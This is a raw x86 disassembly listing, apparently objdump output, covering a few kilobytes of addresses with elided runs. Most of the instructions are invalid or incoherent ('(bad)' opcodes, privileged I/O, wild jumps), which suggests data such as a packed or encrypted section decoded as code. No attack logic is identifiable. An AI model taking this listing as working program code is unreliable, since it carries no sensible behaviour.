  402b1a:	call   0x793eb09b
  402b1f:	jge    0x402b39
  402b21:	jbe    0x402b95
  402b23:	push   edi
	...
  402b34:	add    BYTE PTR [eax],al
  402b36:	in     al,0x1f
  402b38:	sub    eax,edx
  402b3a:	test   eax,0xe7d136ca
  402b3f:	ja     0x402b7c
  402b41:	mov    ds:0x3e68780,al
  402b46:	pop    esp
  402b47:	lock mov ch,0x34
  402b4a:	fadd   DWORD PTR [edi+ebp*1+0x28fdf004]
  402b51:	push   edi
  402b52:	imul   DWORD PTR [ecx]
  402b54:	mov    ds:0xf1c5a931,al
  402b59:	add    edi,DWORD PTR [ecx+0x1]
  402b5c:	add    BYTE PTR [edx-0x46],ch
  402b5f:	add    ebp,ebx
  402b61:	pop    ss
  402b62:	ins    BYTE PTR es:[edi],dx
  402b63:	or     BYTE PTR [eax],al
  402b65:	jmp    0x3f9b555d
  402b6a:	dec    ebx
  402b6b:	lds    ecx,FWORD PTR [eax]
  402b6d:	jmp    0x632ca930
  402b72:	dec    DWORD PTR ss:[edx]
  402b75:	test   eax,0x180041f
  402b7a:	hlt    
  402b7b:	push   ebx
  402b7c:	or     DWORD PTR [ecx-0xd],esi
  402b7f:	push   es
  402b80:	add    cl,ch
  402b82:	call   0xebb4:0xf4e904c5
  402b89:	div    BYTE PTR [ebx+0xf]
  402b8c:	pop    esp
  402b8d:	sbb    eax,0xbe3886ef
  402b92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b93:	add    DWORD PTR [edx+0x6f3e8],edi
  402b99:	xchg   edx,eax
	...
  402baa:	add    BYTE PTR [eax],al
  402bac:	test   BYTE PTR [eax+eax*1+0x4006f3e9],0x69
  402bb4:	jmp    0x402bbc
  402bb6:	jne    0x402c05
  402bb8:	xchg   esp,eax
  402bb9:	(bad)  
  402bba:	leave  
  402bbb:	sub    esi,edi
  402bbd:	push   es
  402bbe:	push   ebp
  402bbf:	bound  esp,QWORD PTR [edi]
  402bc1:	xor    dl,BYTE PTR [esi-0x46]
  402bc4:	jl     0x402c09
  402bc6:	or     al,0xec
  402bc8:	repz add al,BYTE PTR [eax]
  402bcb:	jmp    0x41911272
  402bd0:	popf   
  402bd1:	sar    bh,cl
  402bd3:	cs pop esp
  402bd5:	iret   
  402bd6:	mov    eax,DWORD PTR [ecx+0x54]
  402bd9:	push   esp
  402bda:	or     BYTE PTR [edx+0xe],dh
  402bdd:	sti    
  402bde:	jmp    0x2720:0xb3f8feb
  402be5:	add    al,0x80
  402be7:	add    BYTE PTR [edi-0x5d0a8b35],ch
  402bed:	mov    WORD PTR [edx+eax*1+0x35],?
  402bf1:	or     eax,0x8133c02b
  402bf6:	leave  
  402bf7:	jne    0x402ba0
  402bf9:	dec    ebp
  402bfa:	ret    
  402bfb:	pop    ebx
  402bfc:	iret   
  402bfd:	sbb    ecx,ecx
  402bff:	ret    0x591
  402c02:	push   ebx
  402c03:	push   esi
  402c04:	pusha  
  402c05:	(bad)  
  402c06:	(bad)  
  402c07:	dec    DWORD PTR [ecx-0x362dccab]
  402c0d:	cmc    
  402c0e:	ficom  DWORD PTR [eax+0x0]
	...
  402c20:	add    BYTE PTR [eax],al
  402c22:	ins    DWORD PTR es:[edi],dx
  402c23:	push   edx
  402c24:	movzx  ecx,BYTE PTR [ecx-0x26d4c3ae]
  402c2b:	das    
  402c2c:	push   es
  402c2d:	nop
  402c2e:	fcmovb st,st(4)
  402c30:	ds nop
  402c32:	sbb    dh,bh
  402c34:	cs nop
  402c36:	in     al,0x0
  402c38:	nop
  402c39:	or     DWORD PTR [ebx+0x6d438ff9],0xfffffff5
  402c40:	(bad)  
  402c41:	jl     0x402c56
  402c43:	stc    
  402c44:	cmp    BYTE PTR [eax+0x403fe0e],dl
  402c4a:	or     dl,BYTE PTR [ebp+0x55583c43]
  402c50:	jl     0x402c5d
  402c52:	fstp   QWORD PTR [eax+edx*4]
  402c55:	jg     0x402c6e
  402c57:	jmp    0x954abc9c
  402c5c:	inc    ebx
  402c5d:	cmp    al,0xb8
  402c5f:	push   esp
  402c60:	jl     0x402c6c
  402c62:	fnstsw WORD PTR [esi]
  402c64:	nop
  402c65:	jg     0x402c3b
  402c67:	call   0x44592fb2
  402c6c:	rol    edx,0xd7
  402c6f:	out    0xb1,al
  402c71:	shl    eax,0x23
  402c74:	push   es
  402c75:	mov    esi,DWORD PTR [edx-0x373e4457]
  402c7b:	(bad)  
  402c7c:	cmp    dl,BYTE PTR [eax+0x5e74157b]
  402c82:	dec    ebx
  402c83:	sbb    eax,0x8b39
	...
  402c98:	mov    WORD PTR [ebp+0x36],gs
  402c9b:	push   esi
  402c9c:	xchg   esp,eax
  402c9d:	push   ebp
  402c9e:	pop    eax
  402c9f:	or     BYTE PTR [eax+0x55],ah
  402ca2:	push   eax
  402ca3:	adc    BYTE PTR [eax+0x65],ah
  402ca6:	inc    eax
  402ca7:	or     al,0x60
  402ca9:	in     eax,dx
  402caa:	stos   BYTE PTR es:[edi],al
  402cab:	jecxz  0x402c7f
  402cad:	sub    eax,0xc589034
  402cb2:	iret   
  402cb3:	jmp    DWORD PTR [edi+0x2e]
  402cb6:	mov    cl,cl
  402cb8:	fsubrp st(5),st
  402cba:	cdq    
  402cbb:	ror    DWORD PTR [eax-0x2a],0x73
  402cbf:	inc    ebx
  402cc0:	push   edx
  402cc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cc2:	jae    0x402d1d
  402cc4:	pusha  
  402cc5:	pop    ebp
  402cc6:	lds    eax,FWORD PTR [eax+eiz*2]
  402cc9:	pop    ebp
  402cca:	fadd   QWORD PTR [eax+eiz*2]
  402ccd:	add    DWORD PTR [esi+0x739d7b90],ebp
  402cd3:	pop    esi
  402cd4:	(bad)  
  402cd5:	hlt    
  402cd6:	mov    esp,0x38ddecc2
  402cdb:	mov    eax,DWORD PTR [edi+ebx*2]
  402cde:	(bad)  
  402cdf:	in     al,dx
  402ce0:	push   cs
  402ce1:	sub    esi,ecx
  402ce3:	push   ebx
  402ce4:	fist   DWORD PTR [eax+eax*4]
  402ce7:	inc    ebp
  402ce8:	cld    
  402ce9:	lea    ebx,[ebx+0x58]
  402cec:	leave  
  402ced:	sahf   
  402cee:	add    edi,edi
  402cf0:	and    eax,0xf0411cbb
  402cf5:	inc    ebp
  402cf6:	es (bad) 
  402cf8:	lock (bad) 
  402cfb:	mov    edi,0x0
	...
  402d0c:	add    BYTE PTR [eax],al
  402d0e:	pop    ebp
  402d0f:	pop    es
  402d10:	retf   
  402d11:	into   
  402d12:	inc    ebp
  402d13:	neg    DWORD PTR ds:0xea5cf458
  402d19:	pop    ecx
  402d1a:	lock (bad) 
  402d1c:	xchg   esp,eax
  402d1d:	sti    
  402d1e:	mov    dh,0x51
  402d20:	add    eax,0xe9c104db
  402d25:	add    edi,ebx
  402d27:	(bad)  
  402d28:	jl     0x402d2e
  402d2a:	xor    ecx,eax
  402d2c:	je     0x402cfd
  402d2e:	mov    bh,dl
  402d30:	lods   al,BYTE PTR ds:[esi]
  402d31:	add    al,0xf0
  402d33:	sti    
  402d34:	sar    ebp,0x6c
  402d37:	shr    ecx,0x3
  402d3a:	lock jns 0x402da1
  402d3d:	shl    DWORD PTR [esi-0x39],1
  402d40:	(bad)  
  402d41:	xor    al,0xd8
  402d43:	add    ch,al
  402d45:	add    esi,eax
  402d47:	ficom  WORD PTR [ebx-0x1df90f38]
  402d4d:	ret    
  402d4e:	out    0x82,eax
  402d50:	push   ebp
  402d51:	add    al,0xf0
  402d53:	push   es
  402d54:	fadd   QWORD PTR [edi]
  402d56:	icebp  
  402d57:	push   es
  402d58:	jmp    0xe9e5a459
  402d5d:	add    esi,eax
  402d5f:	pop    esp
  402d60:	jmp    0x8013a2e3
  402d65:	int    0x27
  402d67:	or     DWORD PTR ss:[ebp+0x7ee90634],0xcd67d36d
	...
  402d82:	add    BYTE PTR [eax],al
  402d84:	(bad)  
  402d86:	push   ecx
  402d87:	inc    esp
  402d88:	push   es
  402d89:	(bad)  
  402d8a:	push   esi
  402d8b:	stc    
  402d8c:	aas    
  402d8d:	push   ecx
  402d8e:	in     eax,dx
  402d8f:	pop    ebx
  402d90:	push   ss
  402d91:	push   ds
  402d92:	test   al,0x3
  402d94:	jge    0x402d22
  402d96:	cmp    cl,dh
  402d98:	out    0xc6,eax
  402d9a:	add    BYTE PTR [ecx+0x2ef6e0bb],bl
  402da0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402da1:	(bad)  
  402da2:	jne    0x402d95
  402da4:	add    ebp,DWORD PTR [edi-0x394ae9dc]
  402daa:	jmp    0x402d92
  402dac:	lods   al,BYTE PTR ds:[esi]
  402dad:	cmp    al,0x8
  402daf:	pop    esp
  402db0:	outs   dx,DWORD PTR ds:[esi]
  402db1:	mov    edx,0x57bd06fe
  402db6:	call   0x6ebf9
  402dbb:	pusha  
  402dbc:	ja     0x402d71
  402dbe:	(bad)  
  402dbf:	out    dx,al
  402dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402dc1:	xor    DWORD PTR [eax],eax
  402dc3:	push   ebx
  402dc4:	hlt    
  402dc5:	xor    BYTE PTR [edx],al
  402dc7:	push   ebx
  402dc8:	in     al,dx
  402dc9:	xor    BYTE PTR [ebx],al
  402dcb:	inc    ecx
  402dcc:	hlt    
  402dcd:	push   es
  402dce:	add    BYTE PTR [ecx-0x3813835c],ch
  402dd4:	cmp    al,0xc6
  402dd6:	call   0x475ea8
  402ddb:	pusha  
  402ddc:	mov    dh,0xbe
  402dde:	inc    eax
  402ddf:	xor    eax,0xf975c544
  402de4:	cmp    al,0x3c
  402de6:	or     al,0x9e
	...
  402df8:	add    BYTE PTR [eax],al
  402dfa:	sahf   
  402dfb:	mov    esi,0xc61dc7e8
  402e00:	jmp    DWORD PTR [edx-0x75]
  402e03:	(bad)  
  402e04:	jne    0x402d87
  402e06:	dec    ebx
  402e07:	loope  0x402dcc
  402e09:	jmp    0xfd1b4001
  402e0e:	sbb    ch,al
  402e10:	mov    ch,0x7d
  402e12:	and    eax,0xfe51ffc6
  402e17:	retf   0xe900
  402e1a:	xor    al,0x7c
  402e1c:	in     al,dx
  402e1d:	push   edi
  402e1e:	sub    al,0xc6
  402e20:	call   0x64f46
  402e25:	add    BYTE PTR [edx-0x39],ah
  402e28:	pop    ebx
  402e29:	leave  
  402e2a:	sbb    eax,esi
  402e2c:	call   DWORD PTR [edx+edx*2-0x1a]
  402e30:	add    esp,0xffffd415
  402e36:	mov    dl,dl
  402e38:	jne    0x402e46
  402e3a:	out    0x5c,al
  402e3c:	or     BYTE PTR [eax-0x7f],ch
  402e3f:	and    BYTE PTR [ecx+0x0],al
  402e42:	out    0x1c,al
  402e44:	ins    DWORD PTR es:[edi],dx
  402e45:	sub    DWORD PTR [eax+0x9],ebx
  402e48:	call   0x11cb06
  402e4d:	or     ecx,ecx
  402e4f:	ret    0xda84
  402e52:	mov    DWORD PTR [ecx],ecx
  402e54:	add    BYTE PTR [ebx],ch
  402e56:	mov    dl,0x3f
  402e58:	test   edi,ebp
  402e5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e5b:	sar    edi,1
  402e5d:	push   eax
	...
  402e6e:	add    BYTE PTR [eax],al
  402e70:	xor    DWORD PTR [edi],eax
  402e72:	add    DWORD PTR [eax],eax
  402e74:	mov    ecx,esp
  402e76:	in     al,0xc3
  402e78:	pop    ecx
  402e79:	or     DWORD PTR [ebx],ecx
  402e7b:	rcl    BYTE PTR [esi+0x45],0xbd
  402e7f:	add    BYTE PTR [ecx+0x9],cl
  402e82:	cmp    eax,0x94804
  402e87:	pmaxub mm3,QWORD PTR [eax+eax*1+0x453e5900]
  402e8f:	cld    
  402e90:	stc    
  402e91:	loop   0x402e4d
  402e93:	jmp    0x85cdfffe
  402e98:	xchg   al,dl
  402e9a:	(bad)  
  402e9b:	dec    DWORD PTR [ecx]
  402e9d:	jecxz  0x402eee
  402e9f:	std    
  402ea0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ea1:	ror    DWORD PTR [ebx],1
  402ea3:	rcr    BYTE PTR [ebp*4+0x4be1de67],0x0
  402eab:	lea    ecx,[ecx+eiz*8+0x5cf0fffe]
  402eb2:	xor    al,0xe8
  402eb4:	or     BYTE PTR [edx-0x35],bl
  402eb7:	(bad)  
  402eb8:	out    dx,eax
  402eb9:	cmp    ebx,0x4f
  402ebc:	fadd   st,st(1)
  402ebe:	sar    edi,1
  402ec0:	fisttp WORD PTR [ecx-0x5]
  402ec3:	(bad)  
  402ec4:	pop    ebp
  402ec5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ec6:	js     0x402e4d
  402ec8:	fucomip st,st(4)
  402eca:	retf   0x20ff
  402ecd:	push   ss
  402ece:	mov    edx,0x341dbff5
  402ed3:	inc    DWORD PTR [eax]
	...
  402ee5:	add    BYTE PTR ds:0x16e83412,bh
  402eeb:	sbb    ebx,ecx
  402eed:	(bad)  
  402eee:	sti    
  402eef:	in     eax,dx
  402ef0:	dec    edi
  402ef1:	push   ebx
  402ef2:	lahf   
  402ef3:	inc    ebx
  402ef4:	(bad)  
  402ef5:	call   0xb36b1
  402efa:	jns    0x402eef
  402efc:	retf   
  402efd:	add    DWORD PTR ds:0x327403a6,0x2b
  402f04:	inc    eax
  402f05:	hlt    
  402f06:	and    ch,dl
  402f08:	push   eax
  402f09:	cld    
  402f0a:	pop    eax
  402f0b:	sbb    al,0xc0
  402f0d:	add    al,dh
  402f0f:	sub    al,bl
  402f11:	js     0x402f35
  402f13:	jge    0x402f65
  402f15:	hlt    
  402f16:	dec    eax
  402f17:	mov    al,0xc6
  402f19:	add    al,dh
  402f1b:	mov    eax,0xfe0e74c3
  402f20:	retf   0x3875
  402f23:	xchg   BYTE PTR ds:0x7e9537f2,al
  402f29:	fmul   st,st(0)
  402f2b:	mov    WORD PTR [eax-0x8],ss
  402f2e:	ret    
  402f2f:	sbb    eax,0x3d222cdc
  402f34:	retf   0x9dff
  402f37:	cmp    ebx,ebx
  402f39:	out    0x32,al
  402f3b:	pop    es
  402f3c:	jmp    0xed8aaa44
  402f41:	retf   0xbe85
  402f44:	add    cx,WORD PTR [eax]
  402f47:	into   
  402f48:	pop    eax
  402f49:	retf   0x0
	...
  402f5c:	out    dx,eax
  402f5d:	ret    
  402f5e:	mov    esp,0x4ff4d8c7
  402f63:	retf   0x8fdf
  402f66:	sub    ch,BYTE PTR [esi]
  402f68:	test   eax,0x2503e1c8
  402f6d:	nop
  402f6e:	adc    eax,0xf1417b32
  402f73:	fsubrp st(1),st
  402f75:	pop    ebx
  402f76:	add    al,BYTE PTR [ecx]
  402f78:	push   0x4b
  402f7a:	call   0x698c26fa
  402f7f:	or     dh,al
  402f81:	cmp    esp,esi
  402f83:	sub    DWORD PTR [edi],ebp
  402f85:	dec    esp
  402f86:	imul   ecx,DWORD PTR [edx],0x83033ad0
  402f8c:	iret   
  402f8d:	adc    DWORD PTR [ebp-0x21],ebx
  402f90:	jo     0x402f95
  402f92:	repz dec edi
  402f94:	nop
  402f95:	xchg   BYTE PTR [esi],dl
  402f97:	sti    
  402f98:	add    esp,eax
  402f9a:	bound  eax,QWORD PTR [edi-0x8]
  402f9d:	ret    
  402f9e:	cmp    al,0xfc
  402fa0:	dec    edi
  402fa1:	mov    DWORD PTR [ebx-0x4e780ffc],ebp
  402fa7:	add    al,0xde
  402fa9:	jmp    0x403013
  402fab:	dec    eax
  402fac:	or     ah,al
  402fae:	leave  
  402faf:	dec    edi
  402fb0:	fld    QWORD PTR [esi+0x113f0c1d]
  402fb6:	sbb    eax,0xd142b7fa
  402fbb:	enter  0x3afa,0xee
  402fbf:	add    DWORD PTR [eax],0x0
	...
  402fd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fd3:	(bad)  
  402fd4:	jge    0x402fd1
  402fd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fd7:	or     eax,DWORD PTR [eax]
  402fd9:	scas   eax,DWORD PTR es:[edi]
  402fda:	mov    al,0xfe
  402fdc:	(bad)  
  402fdd:	jmp    0xec2b380e
  402fe2:	and    al,0xd2
  402fe4:	pop    edi
  402fe5:	xor    BYTE PTR [esi],dh
  402fe7:	or     al,BYTE PTR [eax]
  402fe9:	mov    esp,0x2583b274
  402fee:	rcl    BYTE PTR [esi-0x7d],1
  402ff1:	add    al,0xe5
  402ff3:	icebp  
  402ff4:	inc    eax
  402ff5:	jmp    0x6a526aed
  402ffa:	out    dx,eax
  402ffb:	adc    DWORD PTR [edi],ebp
  402ffd:	test   al,0xf3
  402fff:	push   es
  403000:	je     0x402ff2
  403002:	ins    BYTE PTR es:[edi],dx
  403003:	add    al,0xf7
  403005:	iret   
  403006:	xor    al,BYTE PTR [edi]
  403008:	add    BYTE PTR [eax+esi*8+0x6ab2bfed],bl
  40300f:	lds    ecx,FWORD PTR [eax]
  403011:	jmp    0xa5080e1a
  403016:	scas   eax,DWORD PTR es:[edi]
  403017:	pop    es
  403018:	add    cl,ch
  40301a:	repz xchg ebx,eax
  40301c:	inc    ebp
  40301d:	icebp  
  40301e:	ret    
  40301f:	shl    DWORD PTR [ebp-0xf],0x25
  403023:	pop    es
  403024:	push   esp
  403026:	jl     0x403019
  403028:	inc    eax
  403029:	jmp    0x32b4b2a2
  40302e:	dec    esp
  40302f:	cmp    edx,eax
  403031:	jmp    0x6d10be29
	...
  403046:	add    BYTE PTR [eax],al
  403048:	push   ds
  403049:	mov    ebx,0x550c4350
  40304e:	call   esp
  403050:	and    cl,dh
  403052:	inc    eax
  403053:	jmp    0xd0b4b29c
  403058:	xor    BYTE PTR [esp+eiz*8-0x18],cl
  40305c:	repz push es
  40305e:	add    BYTE PTR [esi+0x8fbebe],cl
  403064:	aam    0xe2
  403066:	push   DWORD PTR [ebp-0x63]
  403069:	ds inc ebp
  40306b:	in     al,dx
  40306c:	mov    cl,BYTE PTR [eax+0xc]
  40306f:	add    BYTE PTR ds:0xa945c6bd,al
  403075:	or     eax,DWORD PTR [eax]
  403077:	add    BYTE PTR [ecx],cl
  403079:	jecxz  0x403082
  40307b:	mov    DWORD PTR [esi+edx*8+0x0],0x6a05d900
  403083:	add    bl,al
  403085:	add    eax,0x14c106a
  40308a:	in     al,0x50
  40308c:	mov    bl,0x5
  40308e:	push   DWORD PTR [ebp+0x5]
  403091:	iret   
  403092:	adc    eax,0x449e0f
  403097:	or     ecx,DWORD PTR [ecx]
  403099:	push   edx
  40309a:	add    DWORD PTR [ebx+0x4a],eax
  40309d:	dec    ecx
  40309e:	hlt    
  40309f:	add    BYTE PTR [ebp-0x5a8a0143],al
  4030a5:	fcomp  QWORD PTR [edx-0x74fa763f]
  4030ab:	ret    
	...
  4030bc:	add    BYTE PTR [eax],al
  4030be:	cmp    BYTE PTR [edx+eax*8+0x8],0x99
  4030c3:	lock mov ch,ah
  4030c6:	mov    ss,WORD PTR [edi+0x8]
  4030c9:	call   0x40fcd3
  4030ce:	leave  
  4030cf:	cli    
  4030d0:	out    0xa0,eax
  4030d2:	dec    ecx
  4030d3:	leave  
  4030d4:	call   DWORD PTR [eax+0x2e]
  4030d7:	push   edi
  4030d8:	or     BYTE PTR [eax+0x41],dl
  4030db:	imul   eax,ecx,0x0
  4030de:	dec    ecx
  4030df:	in     eax,dx
  4030e0:	enter  0x55c2,0x5
  4030e4:	push   ebp
  4030e5:	mov    ebx,DWORD PTR [ebp-0x7b]
  4030e8:	(bad)  
  4030e9:	cld    
  4030ea:	cli    
  4030eb:	test   DWORD PTR [ebp+0x8],edi
  4030ee:	lock scas eax,DWORD PTR es:[edi]
  4030f0:	push   eax
  4030f1:	pop    es
  4030f2:	fld    TBYTE PTR [edi+0x2b]
  4030f5:	leave  
  4030f6:	xor    dh,BYTE PTR [ebx+0x153b2b03]
  4030fc:	add    al,0x6a
  4030fe:	lock add eax,0x5f06a04
  403104:	(bad)  
  403105:	(bad)  
  403106:	jge    0x4030bf
  403108:	pop    ecx
  403109:	add    BYTE PTR [edx+0x31c4dbaf],cl
  40310f:	scas   eax,DWORD PTR es:[edi]
  403110:	add    ecx,DWORD PTR [ebx]
  403112:	mov    al,0xda
  403114:	adc    cl,BYTE PTR [ecx+0x75c74a2d]
  40311a:	fcom   QWORD PTR [esi+0x2e]
  40311d:	lock xlat BYTE PTR ds:[ebx]
  40311f:	stc    
  403120:	cli    
  403121:	mov    edi,0x0
	...
  403132:	add    BYTE PTR [eax],al
  403134:	inc    esp
  403135:	or     bh,BYTE PTR [ebx-0x28]
  403138:	pop    edx
  403139:	scas   al,BYTE PTR es:[edi]
  40313a:	pop    ecx
  40313b:	add    BYTE PTR [edi+0x4a53c79b],bh
  403141:	sbb    edi,eax
  403143:	jne    0x40313d
  403145:	add    DWORD PTR [ebx],0x6a
  403148:	lock adc eax,0xadf0c16d
  40314e:	cli    
  40314f:	mov    edi,0xe832a61d
  403154:	jmp    0xdc3ff816
  403159:	les    edi,FWORD PTR [edx-0x3d]
  40315c:	sbb    esi,DWORD PTR [edi-0x3f]
  40315f:	add    al,0xf0
  403161:	add    bh,BYTE PTR [ebx-0x14]
  403164:	jae    0x4031d0
  403166:	xlat   BYTE PTR ds:[ebx]
  403167:	push   eax
  403168:	ret    
  403169:	push   ds
  40316a:	xor    dl,BYTE PTR [edi-0x3a]
  40316d:	xor    al,0x40
  40316f:	or     al,0x65
  403171:	add    DWORD PTR es:[eax],0xfffffff0
  403175:	lods   eax,DWORD PTR ds:[esi]
  403176:	js     0x40318c
  403178:	sub    eax,0xf003e907
  40317d:	push   es
  40317e:	jb     0x40312b
  403180:	imul   ecx,edi,0xffffffa8
  403183:	fcomi  st,st(6)
  403185:	lea    esp,[eax+ebx*8]
  403188:	jnp    0x4031cc
  40318a:	icebp  
  40318b:	add    bl,BYTE PTR [ecx]
  40318d:	leave  
  40318e:	out    0x83,al
  403190:	jae    0x403136
  403192:	mov    dh,0x1a
  403194:	or     eax,DWORD PTR [edx+esi*2+0xb]
	...
  4031a7:	add    BYTE PTR [eax],al
  4031a9:	add    BYTE PTR [edx+0x38caea10],al
  4031af:	inc    edi
  4031b0:	jmp    0x2a2c21b8
  4031b5:	add    ch,al
  4031b7:	mov    edi,0x5779d7a4
  4031bc:	add    DWORD PTR [ecx+0x65],edi
  4031bf:	mov    bh,0x26
  4031c1:	std    
  4031c2:	lock jecxz 0x403170
  4031c5:	pop    esi
  4031c6:	mov    bh,0x48
  4031c8:	in     eax,0x7c
  4031ca:	fwait
  4031cb:	rcl    DWORD PTR [esi],1
  4031cd:	mov    esi,0xa71f0f36
  4031d2:	jp     0x403172
  4031d4:	cs cmp eax,0x11b538fc
  4031da:	add    al,al
  4031dc:	jl     0x4031b5
  4031de:	lahf   
  4031df:	cmp    ecx,esi
  4031e1:	js     0x403210
  4031e3:	mov    bh,0x99
  4031e5:	frstpm(287 only) 
  4031e7:	push   es
  4031e8:	jmp    0xedbdb5f0
  4031ed:	add    esi,eax
  4031ef:	push   es
  4031f0:	jb     0x403239
  4031f2:	loopne 0x4031a7
  4031f4:	mov    WORD PTR [esi],fs
  4031f6:	iret   
  4031f7:	pop    esp
  4031f8:	xor    BYTE PTR [ecx],ch
  4031fa:	enter  0xabcd,0xf8
  4031fe:	pop    edi
  4031ff:	pop    edx
  403200:	jb     0x4031da
  403202:	jae    0x4031ce
  403204:	add    BYTE PTR [ebp+0x1a50581e],dh
  40320a:	add    edx,DWORD PTR [ebp-0x75]
  40320d:	sbb    al,0x0
	...
  40321f:	add    BYTE PTR [eax],bh
  403221:	mov    WORD PTR [ebp-0xf],?
  403224:	mov    eax,0xef601049
  403229:	ret    0xe68b
  40322c:	test   al,0x5f
  40322e:	add    al,0x72
  403230:	in     eax,0xe
  403232:	mov    edx,DWORD PTR [esi]
  403234:	sbb    BYTE PTR [ecx+edi*8-0x51cc646],cl
  40323b:	mov    edx,0xee849139
  403240:	stos   DWORD PTR es:[edi],eax
  403241:	push   0x6a
  403243:	ss icebp 
  403245:	or     cl,al
  403247:	sub    ebp,ebp
  403249:	or     ebx,eax
  40324b:	bound  edi,QWORD PTR [ecx-0x53f50706]
  403251:	cli    
  403252:	clc    
  403253:	ins    BYTE PTR es:[edi],dx
  403254:	pusha  
  403255:	push   ss
  403256:	push   esi
  403257:	jle    0x4031e6
  403259:	scas   eax,DWORD PTR es:[edi]
  40325a:	add    edx,DWORD PTR [edi-0xa3d3839]
  403260:	lock (bad) 
  403262:	mov    esp,DWORD PTR [ecx]
  403264:	loope  0x403227
  403266:	and    edx,DWORD PTR [ebx]
  403268:	add    edx,eax
  40326a:	lea    ebx,[ebp-0x63]
  40326d:	loope  0x4032df
  40326f:	leave  
  403270:	dec    DWORD PTR [ecx]
  403272:	dec    esi
  403273:	icebp  
  403274:	mov    dl,0xc8
  403276:	adc    edx,ebp
  403278:	dec    ecx
  403279:	xchg   edx,eax
  40327a:	cli    
  40327b:	mov    edx,0x1af8eabb
  403280:	lods   al,BYTE PTR ds:[esi]
  403281:	mov    WORD PTR [esi+edi*8+0x0],ds
	...
  403294:	add    BYTE PTR [eax],al
  403296:	popf   
  403297:	int    0xbd
  403299:	test   al,0xf0
  40329b:	pop    esp
  40329c:	or     al,0xa8
  40329e:	xor    BYTE PTR ds:0x3f900003,dl
  4032a4:	stc    
  4032a5:	xor    esi,DWORD PTR [ebx]
  4032a7:	out    0xfa,eax
  4032a9:	xor    eax,DWORD PTR [ebx-0x39f87bcb]
  4032af:	mov    dl,0x7b
  4032b1:	cmc    
  4032b2:	dec    edx
  4032b3:	cld    
  4032b4:	xadd   DWORD PTR [ecx-0x6d3cfd45],ecx
  4032bb:	into   
  4032bc:	xor    edi,ecx
  4032be:	cmp    dl,dl
  4032c0:	xor    edi,ecx
  4032c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032c3:	sub    eax,0x3b4f2a17
  4032c8:	inc    edi
  4032c9:	add    ebp,edi
  4032cb:	mov    dh,0xc0
  4032cd:	ret    0x725
  4032d0:	ror    BYTE PTR [ebx+0x23fb1691],1
  4032d6:	xchg   ebx,eax
  4032d7:	push   ss
  4032d8:	sti    
  4032d9:	lea    edx,[ebp-0x4d]
  4032dc:	adc    al,BYTE PTR [esi+0x9]
  4032df:	fwait
  4032e0:	add    ecx,DWORD PTR [esi-0x2f]
  4032e3:	enter  0x11c1,0xca
  4032e7:	jg     0x403274
  4032e9:	cli    
  4032ea:	retf   0x23d1
  4032ed:	stc    
  4032ee:	retf   0x8dd1
  4032f1:	pushf  
  4032f2:	test   BYTE PTR [ecx],0x95
  4032f5:	inc    esi
  4032f6:	aam    0x6
  4032f8:	pop    esi
  4032f9:	sbb    al,0x0
	...
  40330b:	add    al,bl
  40330d:	(bad)  
  40330e:	push   ss
  40330f:	add    esp,eax
  403311:	ds stc 
  403313:	xor    esi,ebx
  403315:	out    0xfa,al
  403317:	xor    esi,ebx
  403319:	xor    al,0x84
  40331b:	pop    es
  40331c:	loope  0x40334f
  40331e:	sub    BYTE PTR [ecx-0x66],0xfb
  403322:	pop    ds
  403323:	ror    DWORD PTR [ecx+0x11],0x3
  403327:	ret    
  403328:	add    bh,BYTE PTR [esi+0x33]
  40332b:	stc    
  40332c:	lock adc BYTE PTR [ebx+esi*1+0x17985a69],bh
  403334:	(bad)  
  403335:	jl     0x40337f
  403337:	mov    esi,ebx
  403339:	adc    eax,0xa332c0e8
  40333e:	push   es
  40333f:	sar    BYTE PTR [ebx+0x77],1
  403342:	idiv   edx
  403344:	adc    ebp,DWORD PTR [edx-0x9]
  403347:	cli    
  403348:	sub    edx,DWORD PTR gs:[ebx]
  40334b:	mov    cl,0xcb
  40334d:	xchg   esp,eax
  40334e:	ret    
  40334f:	add    esi,DWORD PTR [esi+0x1c1c4c7]
  403355:	mov    cl,0xcd
  403357:	mov    ebx,DWORD PTR [edx]
  403359:	cmp    BYTE PTR [ebx-0x447ff6dd],0x8d
  403360:	fs int3 
  403362:	adc    edi,0x5e07369c
  403368:	(bad)  
  403369:	out    dx,al
  40336a:	(bad)  
  40336b:	push   ss
  40336c:	repz test BYTE PTR [esi+0xf9],0x0
	...
  403380:	add    BYTE PTR [eax],al
  403382:	and    ebx,DWORD PTR [eax-0x19]
  403385:	cli    
  403386:	and    ecx,DWORD PTR [eax-0x6f]
  403389:	test   bh,ch
  40338b:	unpckhps xmm2,XMMWORD PTR [eax+0x3049b15b]
  403392:	mov    cl,0xee
  403394:	or     al,BYTE PTR [ebx]
  403396:	mov    bl,0x39
  403398:	mov    edi,0xbbd1b933
  40339d:	xor    ebp,DWORD PTR [ecx-0x7ce867dd]
  4033a3:	lahf   
  4033a4:	fwait
  4033a5:	std    
  4033a6:	repz fwait
  4033a8:	test   eax,0xd006aab2
  4033ae:	jnp    0x403366
  4033b0:	idiv   dl
  4033b2:	shl    DWORD PTR [edi+0x76dfaf6],cl
  4033b8:	jne    0x4033cc
  4033ba:	dec    ax
  4033bc:	pusha  
  4033bd:	push   0xfffffff3
  4033bf:	dec    esp
  4033c0:	adc    ebp,eax
  4033c2:	xor    DWORD PTR [esi],edx
  4033c4:	jmp    0x13bb:0xfac16bcd
  4033cb:	mov    esi,0x9b7dbbfa
  4033d0:	(bad)  
  4033d1:	in     al,0xef
  4033d3:	jb     0x4033f5
  4033d5:	pop    es
  4033d6:	sahf   
  4033d7:	cli    
  4033d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033d9:	(bad)  
  4033da:	fiadd  WORD PTR [edi]
  4033dc:	ror    BYTE PTR [esi-0x196e07d7],0x29
  4033e3:	clc    
  4033e4:	(bad)  
  4033e5:	nop
	...
